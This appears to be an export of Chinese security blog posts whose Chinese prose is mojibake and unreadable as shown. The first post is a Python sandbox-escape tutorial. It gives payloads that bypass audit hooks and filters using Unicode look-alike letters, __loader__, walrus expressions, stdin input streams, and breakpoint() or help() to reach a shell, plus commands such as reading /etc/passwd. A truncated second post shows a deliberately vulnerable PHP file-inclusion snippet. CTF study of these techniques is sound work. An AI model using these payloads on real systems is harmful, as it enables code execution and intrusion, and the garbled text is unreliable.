<p>å®¡è®¡é’©å­é€šè¿‡ <code>sys.addaudithook()</code> å‡½æ•°æ·»åŠ ã€‚æ¯å½“å‘ç”Ÿç‰¹å®šäº‹ä»¶æ—¶ï¼ŒPythonä¼šè°ƒç”¨è¿™äº›é’©å­å‡½æ•°ï¼Œå¹¶å°†äº‹ä»¶åç§°å’Œç›¸å…³å‚æ•°ä¼ é€’ç»™å®ƒä»¬ã€‚é’©å­å‡½æ•°å¯ä»¥é€‰æ‹©è®°å½•è¿™äº›äº‹ä»¶ï¼Œæˆ–è€…åœ¨æ£€æµ‹åˆ°ä¸å…è®¸çš„æ“ä½œæ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œé˜»æ­¢æ“ä½œç»§ç»­è¿›è¡Œã€‚</p>
</blockquote>
<p>è€Œå‘ç”Ÿå®¡è®¡äº‹ä»¶æ—¶ï¼ŒPythonå°±ä¼šè°ƒç”¨è¿™äº›é’©å­</p>
<p>Python ä¸­çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç±»ï¼š</p>
<ul>
<li><code>import</code>ï¼šå‘ç”Ÿåœ¨å¯¼å…¥æ¨¡å—æ—¶ã€‚</li>
<li><code>open</code>ï¼šå‘ç”Ÿåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ã€‚</li>
<li><code>write</code>ï¼šå‘ç”Ÿåœ¨å†™å…¥æ–‡ä»¶æ—¶ã€‚</li>
<li><code>exec</code>ï¼šå‘ç”Ÿåœ¨æ‰§è¡ŒPythonä»£ç æ—¶ã€‚</li>
<li><code>compile</code>ï¼šå‘ç”Ÿåœ¨ç¼–è¯‘Pythonä»£ç æ—¶ã€‚</li>
<li><code>socket</code>ï¼šå‘ç”Ÿåœ¨åˆ›å»ºæˆ–ä½¿ç”¨ç½‘ç»œå¥—æ¥å­—æ—¶ã€‚</li>
<li><code>os.system</code>ï¼Œ<code>os.popen</code>ç­‰ï¼šå‘ç”Ÿåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ—¶ã€‚</li>
<li><code>subprocess.Popen</code>ï¼Œ<code>subprocess.run</code>ç­‰ï¼šå‘ç”Ÿåœ¨å¯åŠ¨å­è¿›ç¨‹æ—¶</li>
</ul>
<p>æ‰€æœ‰çš„äº‹ä»¶åˆ—è¡¨å¯è§ï¼š</p>
<ul>
<li><a href="https://docs.python.org/3/library/audit_events.html">Audit events table â€” Python 3.13.0 documentation</a></li>
<li><a href="https://peps.python.org/pep-0578/">PEP 578 â€“ Python Runtime Audit Hooks</a></li>
</ul>
<p>ä½ å¯ä»¥å®šä¹‰ä¸€ä¸ªå‡½æ•°</p>
<pre><code class="highlight plaintext">def waf(event,args):
	if not event in [&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:
		raise Exception(&quot;Errror&quot;)
sys.addaudithook(waf)</code></pre>

<p>æ¥ç€ä¹‹åçš„ä»£ç ä¸€æ—¦ä¸åœ¨ç™½åå•å†…å°±ä¼š<code>raise Exception</code></p>
<h4 id="ç¯¡æ”¹å†…ç½®å‡½æ•°"><a href="#ç¯¡æ”¹å†…ç½®å‡½æ•°" class="headerlink" title="ç¯¡æ”¹å†…ç½®å‡½æ•°"></a>ç¯¡æ”¹å†…ç½®å‡½æ•°</h4><h3 id="ä¹±ä¸ƒå…«ç³Ÿçš„WAF"><a href="#ä¹±ä¸ƒå…«ç³Ÿçš„WAF" class="headerlink" title="ä¹±ä¸ƒå…«ç³Ÿçš„WAF"></a>ä¹±ä¸ƒå…«ç³Ÿçš„WAF</h3><h4 id="è¿‡æ»¤import"><a href="#è¿‡æ»¤import" class="headerlink" title="è¿‡æ»¤import"></a>è¿‡æ»¤import</h4><p><strong><code>__import__</code></strong></p>
<p>é™¤äº†å¯ä»¥ä½¿ç”¨ importï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>__import__</code>å’Œ <code>importlib.import_module</code>æ¥å¯¼å…¥æ¨¡å—<br><code>importlib </code>éœ€è¦è¿›è¡Œå¯¼å…¥åæ‰èƒ½å¤Ÿä½¿ç”¨</p>
<p>è¿˜å¯ä»¥ä½¿ç”¨<code>execfile</code></p>
<pre><code class="highlight python"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)
importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)

<span class="comment">#py2</span>
execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)

<span class="comment">#py3</span>
<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
    <span class="built_in">exec</span>(f.read())
    <span class="comment">#è¿™ä¸ªæ˜¯éœ€è¦äº‹å…ˆçŸ¥é“è·¯å¾„çš„ï¼Œè¦ç”¨sys.path(if)å»äº‹å…ˆè¯•æ¢ä¸€ä¸‹</span></code></pre>

<p><strong><code>__loader__</code></strong></p>
<p><code>__loader__.load_module</code>åº•å±‚å®ç°ä¸ import ä¸åŒ, å¯ä»¥ç»•è¿‡audithook</p>
<pre><code class="highlight plaintext">__loader__.load_module(&#x27;os&#x27;)</code></pre>

<h4 id="è¿‡æ»¤å­—æ¯"><a href="#è¿‡æ»¤å­—æ¯" class="headerlink" title="è¿‡æ»¤å­—æ¯"></a>è¿‡æ»¤å­—æ¯</h4><p>å¯ä»¥ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡åŠè§’å­—ç¬¦</p>
<pre><code class="highlight plaintext">def halfwidth_to_fullwidth(text):
    &quot;&quot;&quot;å°†åŠè§’å­—ç¬¦è½¬æ¢ä¸ºå…¨è§’å­—ç¬¦&quot;&quot;&quot;
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:  # åŠè§’ç©ºæ ¼ â†’ å…¨è§’ç©ºæ ¼
            result.append(&#x27;\u3000&#x27;)
        elif 0x21 &lt;= code &lt;= 0x7E:  # å¯æ‰“å°ASCIIå­—ç¬¦ â†’ å…¨è§’å­—ç¬¦
            result.append(chr(code + 0xFEE0))
        else:  # å…¶ä»–å­—ç¬¦ä¿æŒä¸å˜
            result.append(char)
    return &#x27;&#x27;.join(result)

# ç›®æ ‡å­—ç¬¦ä¸²
target_string = &quot;eval&quot;

# è½¬æ¢å¹¶ç›´æ¥æ‰“å°ç»“æœ
print(halfwidth_to_fullwidth(target_string))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703093113593.png" alt="image-20250703093113593"></p>
<p>å¯ä»¥çœ‹åˆ°ç»•è¿‡æˆåŠŸ</p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ä¹Ÿå¯ä»¥ç»•è¿‡ï¼Œåˆ©ç”¨ç‰¹æ®Šçš„Unicodeå­—ç¬¦</p>
<pre><code class="highlight plaintext">ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—
ğ˜¢ğ˜£ğ˜¤ğ˜¥ğ˜¦ğ˜§ğ˜¨ğ˜©ğ˜ªğ˜«ğ˜¬ğ˜­ğ˜®ğ˜¯ğ˜°ğ˜±ğ˜²ğ˜³ğ˜´ğ˜µğ˜¶ğ˜·ğ˜¸ğ˜¹ğ˜ºğ˜» 
ğ˜ˆğ˜‰ğ˜Šğ˜‹ğ˜Œğ˜ğ˜ğ˜ğ˜ğ˜‘ğ˜’ğ˜”ğ˜•ğ˜–ğ˜—ğ˜˜ğ˜™ğ˜šğ˜›ğ˜œğ˜ğ˜ğ˜Ÿğ˜ ğ˜¡</code></pre>

<pre><code class="highlight plaintext">#coding=utf-8
def convert_to_math_sans_italic(text):
    result = []
    for char in text:
        code = ord(char)
        if 0x30 &lt;= code &lt;= 0x39:
            result.append(chr(code - 0x30 + 0x1D7EC))
        elif 0x61 &lt;= code &lt;= 0x7A:
            result.append(chr(code - 0x61 + 0x1D622))
        elif 0x41 &lt;= code &lt;= 0x5A:
            result.append(chr(code - 0x41 + 0x1D608))
        else:
            result.append(char)
    return &#x27;&#x27;.join(result)

if __name__ == &quot;__main__&quot;:
    original = &quot;eval&quot;
    converted = convert_to_math_sans_italic(original)
    print(&quot;åŸå§‹å­—ç¬¦ä¸²:&quot;, original)
    print(&quot;è½¬æ¢ç»“æœ: &quot;, converted)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094342023.png" alt="image-20250703094342023"></p>
<p>å¯ä»¥çœ‹åˆ°ä¹Ÿç»•è¿‡æˆåŠŸäº†</p>
<p>ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯æ”¾åœ¨è¯­å¥ä¸­æ—¶ç»å¯¹ä¸èƒ½ç”¨å…¨è§’å­—ç¬¦ä½œå¼€å¤´ï¼Œä¼šè¤’å§’</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703094649462.png" alt="image-20250703094649462"></p>
<h4 id="è¿‡æ»¤å±æ€§"><a href="#è¿‡æ»¤å±æ€§" class="headerlink" title="è¿‡æ»¤å±æ€§"></a>è¿‡æ»¤å±æ€§</h4><p>åˆ©ç”¨ä¸€ä¸‹<code>getattr</code>è¿™ä¸ªå‡½æ•°</p>
<p>åŠŸèƒ½å…¶å®å°±æ˜¯è·å–ç±»çš„æŸä¸ªå±æ€§å€¼</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; getattr(os,&#x27;system&#x27;)(&#x27;cat /etc/passwd&#x27;)
root:x:0:0:root:/root:/usr/bin/zsh</code></pre>

<p>ä¹Ÿå¯ä»¥ç”¨<code>__getattribute__</code>æ–¹æ³•æ›¿æ¢</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; os.__getattribute__(&#x27;system&#x27;)
&lt;built-in function system&gt;</code></pre>

<p>è¿˜å¯ä»¥ç”¨<code>__getattr</code>__</p>
<pre><code class="highlight plaintext">è¿™æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•</code></pre>

<h4 id="è¡Œæ•°é™åˆ¶"><a href="#è¡Œæ•°é™åˆ¶" class="headerlink" title="è¡Œæ•°é™åˆ¶"></a>è¡Œæ•°é™åˆ¶</h4><p>ç»•è¿‡å¤šè¡Œé™åˆ¶çš„åˆ©ç”¨æ‰‹æ³•é€šå¸¸åœ¨é™åˆ¶äº†å•è¡Œä»£ç çš„æƒ…å†µä¸‹ä½¿ç”¨,ä¾‹å¦‚ eval, ä¸­é—´å¦‚æœå­˜åœ¨ï¼›æˆ–è€…æ¢è¡Œä¼šæŠ¥é”™ã€‚</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;);print(1)&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
  File &quot;&lt;string&gt;&quot;, line 1
    __import__(&#x27;os&#x27;);print(1)</code></pre>

<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec å¯ä»¥æ”¯æŒæ¢è¡Œç¬¦ä¸<code>;</code></p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)
1</code></pre>

<h5 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h5><p>compile åœ¨ single æ¨¡å¼ä¸‹ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨ \n è¿›è¡Œæ¢è¡Œ, åœ¨ exec æ¨¡å¼ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¡Œä»£ç .</p>
<pre><code class="highlight plaintext">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</code></pre>

<h5 id="æµ·è±¡è¡¨è¾¾å¼"><a href="#æµ·è±¡è¡¨è¾¾å¼" class="headerlink" title="æµ·è±¡è¡¨è¾¾å¼"></a>æµ·è±¡è¡¨è¾¾å¼</h5><p>æµ·è±¡è¡¨è¾¾å¼æ˜¯ Python 3.8 å¼•å…¥çš„ä¸€ç§æ–°çš„è¯­æ³•ç‰¹æ€§ï¼Œç”¨äºåœ¨è¡¨è¾¾å¼ä¸­åŒæ—¶è¿›è¡Œèµ‹å€¼å’Œæ¯”è¾ƒæ“ä½œã€‚</p>
<p>æµ·è±¡è¡¨è¾¾å¼çš„è¯­æ³•å½¢å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</code></pre>

<p>å€ŸåŠ©æµ·è±¡è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ—è¡¨æ¥æ›¿ä»£å¤šè¡Œä»£ç ï¼š</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[&lt;module &#x27;os&#x27; (frozen)&gt;, 0]</code></pre>

<h4 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h4><p>BYUCTF_2023 ä¸­çš„å‡ é“ jail é¢˜å¯¹ payload çš„é•¿åº¦ä½œäº†é™åˆ¶</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>é¢˜ç›®é™åˆ¶ä¸èƒ½å‡ºç°æ•°å­—å­—æ¯ï¼Œæ„é€ çš„ç›®æ ‡æ˜¯è°ƒç”¨ open å‡½æ•°è¿›è¡Œè¯»å–</p>
<pre><code class="highlight plaintext">print(open(bytes([102,108,97,103,46,116,120,116])).read())</code></pre>

<p>å‡½æ•°åæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œç›´æ¥ä½¿ç”¨ unicodeã€‚æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ ord æ¥è·å–ç„¶åè¿›è¡Œç›¸å‡ã€‚æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ chr(333).</p>
<pre><code class="highlight plaintext"># f = 102 = 333-231 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã§&#x27;)
# a = 108 = 333-225 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¡&#x27;)
# l = 97 = 333-236 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¬&#x27;)
# g = 103 = 333-230 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã¦&#x27;)
# . = 46 = 333-287 = ord(&#x27;Å&#x27;)-ord(&#x27;ÄŸ&#x27;)
# t = 116 = 333-217 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã™&#x27;)
# x = 120 = = 333-213 = ord(&#x27;Å&#x27;)-ord(&#x27;Ã•&#x27;)

print(open(bytes([ord(&#x27;Å&#x27;)-ord(&#x27;Ã§&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã¡&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã¬&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã¦&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;ÄŸ&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã™&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã•&#x27;),ord(&#x27;Å&#x27;)-ord(&#x27;Ã™&#x27;)])).read())</code></pre>

<p>ä½†è¿™æ ·çš„è¯å…¶å®é•¿åº¦è¶…å‡ºäº†é™åˆ¶ã€‚è€Œé¢˜ç›®çš„ eval è¡¨ç¤ºä¸æ”¯æŒåˆ†å· ;ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ª execã€‚ç„¶åå°† ord ä»¥åŠä¸å˜çš„ <code>a(&#39;Å&#39;)</code> è¿›è¡Œæ›¿æ¢ã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ payload</p>
<pre><code class="highlight plaintext">exec(&quot;a=ord;b=a(&#x27;Å&#x27;);print(open(bytes([b-a(&#x27;Ã§&#x27;),b-a(&#x27;Ã¡&#x27;),b-a(&#x27;Ã¬&#x27;),b-a(&#x27;Ã¦&#x27;),b-a(&#x27;ÄŸ&#x27;),b-a(&#x27;Ã™&#x27;),b-a(&#x27;Ã•&#x27;),b-a(&#x27;Ã™&#x27;)])).read())&quot;)</code></pre>

<p>ä½†å…¶å®å°è¯•ä¹‹åå‘ç°è¿™ä¸ª payload ä¼šæŠ¥é”™ï¼ŒåŸå› åœ¨äºå…¶ä¸­çš„æŸäº› unicode å­—ç¬¦é‡åˆ° lower() æ—¶ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé¿å… lower äº§ç”Ÿå¹²æ‰°ï¼Œå¯ä»¥åœ¨é€‰å– unicode æ—¶é€‰æ‹© ord å€¼æ›´å¤§çš„å­—ç¬¦ã€‚ä¾‹å¦‚ chr(4434)</p>
<p>å½“ç„¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ input å‡½æ•°æ¥ç»•è¿‡é•¿åº¦é™åˆ¶ã€‚</p>
<h5 id="æ‰“å¼€-input-è¾“å…¥"><a href="#æ‰“å¼€-input-è¾“å…¥" class="headerlink" title="æ‰“å¼€ input è¾“å…¥"></a>æ‰“å¼€ input è¾“å…¥</h5><p>å¦‚æœæ²™ç®±å†…æ‰§è¡Œçš„å†…å®¹æ˜¯é€šè¿‡ input è¿›è¡Œä¼ å…¥çš„è¯ï¼ˆä¸æ˜¯ web ä¼ å‚ï¼‰ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ä¼ å…¥ä¸€ä¸ª input æ‰“å¼€ä¸€ä¸ªæ–°çš„è¾“å…¥æµï¼Œç„¶åå†è¾“å…¥æœ€ç»ˆçš„ payloadï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ‰€æœ‰çš„é˜²æŠ¤ã€‚</p>
<p>ä»¥ BYUCTF2023 jail a-z0-9 ä¸ºä¾‹ï¼š</p>
<pre><code class="highlight plaintext">eval((__import__(&quot;re&quot;).sub(r&#x27;[a-z0-9]&#x27;,&#x27;&#x27;,input(&quot;code &gt; &quot;).lower()))[:130])</code></pre>

<p>å³ä½¿é™åˆ¶äº†å­—æ¯æ•°å­—ä»¥åŠé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ä¸‹é¢çš„ payloadï¼ˆæ³¨æ„æ˜¯ unicodeï¼‰</p>
<pre><code class="highlight plaintext">ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())</code></pre>

<p>è¿™æ®µ payload æ‰“å¼€ input è¾“å…¥åï¼Œæˆ‘ä»¬å†è¾“å…¥æœ€ç»ˆçš„ payload å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚</p>
<pre><code class="highlight plaintext">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>æ‰“å¼€è¾“å…¥æµéœ€è¦ä¾èµ– input å‡½æ•°ï¼Œno builtins çš„ç¯å¢ƒä¸­æˆ–è€…é¢˜ç›®éœ€è¦ä»¥ http è¯·æ±‚çš„æ–¹å¼è¿›è¡Œè¾“å…¥æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº›æ‰“å¼€è¾“å…¥æµçš„æ–¹å¼:</p>
<ul>
<li><strong>sys.stdin.read()</strong></li>
</ul>
<p>æ³¨æ„è¾“å…¥å®Œæ¯•ä¹‹åæŒ‰ ctrl+d ç»“æŸè¾“å…¥</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.read())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)
kali
0
&gt;&gt;&gt;</code></pre>

<ul>
<li><strong>sys.stdin.readline()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readline())
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<ul>
<li><strong>sys.stdin.readlines()</strong></li>
</ul>
<pre><code class="highlight plaintext">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])
__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</code></pre>

<p>åœ¨ python2 ä¸­ï¼Œåœ¨python 2ä¸­ï¼Œinput å‡½æ•°ä»æ ‡å‡†è¾“å…¥æ¥æ”¶è¾“å…¥ä¹‹åä¼šè‡ªåŠ¨ eval æ±‚å€¼ã€‚å› æ­¤æ— éœ€åœ¨å‰é¢åŠ ä¸Š evalã€‚ä½† raw_input ä¸ä¼šè‡ªåŠ¨ evalã€‚</p>
<h5 id="breakpoint-å‡½æ•°"><a href="#breakpoint-å‡½æ•°" class="headerlink" title="breakpoint å‡½æ•°"></a>breakpoint å‡½æ•°</h5><p>pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚</p>
<p>åœ¨è¾“å…¥ breakpoint() åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç </p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()
--Return--
&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt</code></pre>

<h5 id="help-å‡½æ•°"><a href="#help-å‡½æ•°" class="headerlink" title="help å‡½æ•°"></a>help å‡½æ•°</h5><p>help å‡½æ•°å¯ä»¥æ‰“å¼€å¸®åŠ©æ–‡æ¡£. ç´¢å¼•åˆ° os æ¨¡å—ä¹‹åå¯ä»¥æ‰“å¼€ sh</p>
<p>å½“æˆ‘ä»¬è¾“å…¥ help æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©</p>
<pre><code class="highlight plaintext">ğ˜©ğ˜¦ğ˜­ğ˜±()</code></pre>

<p>ç„¶åè¾“å…¥ os,æ­¤æ—¶ä¼šè¿›å…¥ os çš„å¸®åŠ©æ–‡æ¡£ã€‚</p>
<pre><code class="highlight plaintext">help&gt; os</code></pre>

<p>ç„¶ååœ¨è¾“å…¥ <code>!sh</code> å°±å¯ä»¥æ‹¿åˆ° &#x2F;bin&#x2F;sh, è¾“å…¥ <code>!bash</code> åˆ™å¯ä»¥æ‹¿åˆ° &#x2F;bin&#x2F;bash</p>
<pre><code class="highlight plaintext">help&gt; os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$</code></pre>



<h2 id="vmé€ƒé€¸"><a href="#vmé€ƒé€¸" class="headerlink" title="vmé€ƒé€¸"></a>vmé€ƒé€¸</h2>]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h1><p>ä¾èµ–äº<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>è¿™äº›å‡½æ•°çš„æ¼æ´</p>
<p>ä»€ä¹ˆå«åŒ…å«å‘¢ï¼Ÿä»¥PHPä¸ºä¾‹ï¼Œæˆ‘ä»¬å¸¸å¸¸æŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™å…¥åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œè€Œæ— éœ€å†æ¬¡ç¼–å†™å‡½æ•°ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšåŒ…å«</p>
<p>æœ‰æ—¶å€™ç”±äºç½‘ç«™åŠŸèƒ½éœ€æ±‚ï¼Œä¼šè®©å‰ç«¯ç”¨æˆ·é€‰æ‹©è¦åŒ…å«çš„æ–‡ä»¶ï¼Œè€Œå¼€å‘äººå‘˜åˆæ²¡æœ‰å¯¹è¦åŒ…å«çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ï¼Œå°±å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶çš„ä½ç½®æ¥è®©åå°æ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<p><strong>#</strong> <strong>å‡ ä¸ªå‡½æ•°çš„åŒºåˆ«</strong></p>
<p>require():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ<br>include():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ<br>require_once()ä¸require()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«<br>include_once()ä¸include()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</p>
<p>åªè¦æ–‡ä»¶ä¸­å­˜åœ¨<code>php</code>ä»£ç éƒ½ä¼šè¢«è§£æå‡ºæ¥</p>
<h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«-LFI" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)</h2><p>èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)<br>æµ‹è¯•ç½‘é¡µåŒ…å«å¦‚ä¸‹ä»£ç :</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
	<span class="keyword">include</span>(<span class="variable">$file</span>);
<span class="meta">?&gt;</span></code></pre>

<p>ç½‘ç«™åˆ©ç”¨æ–‡ä»¶åŒ…å«åŠŸèƒ½è¯»å–ä¸€äº›<code>php</code>æ–‡ä»¶ï¼Œä¾‹å¦‚<code>phpinfo</code>:</p>
<p>ä¹Ÿå¯ä»¥åŒ…å«æœ¨é©¬</p>
<p>åˆ©ç”¨è¯¥ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä¸€äº›ç³»ç»Ÿæœ¬åœ°çš„æ•æ„Ÿä¿¡æ¯ã€‚<br>ä¾‹å¦‚:<code>C:\Windows\system.ini</code>æ–‡ä»¶ã€‚<br>ï¼ˆ1ï¼‰ä½¿ç”¨ç»å¯¹è·¯å¾„<br>ä½¿ç”¨ç»å¯¹è·¯å¾„ç›´æ¥è¯»å–:</p>
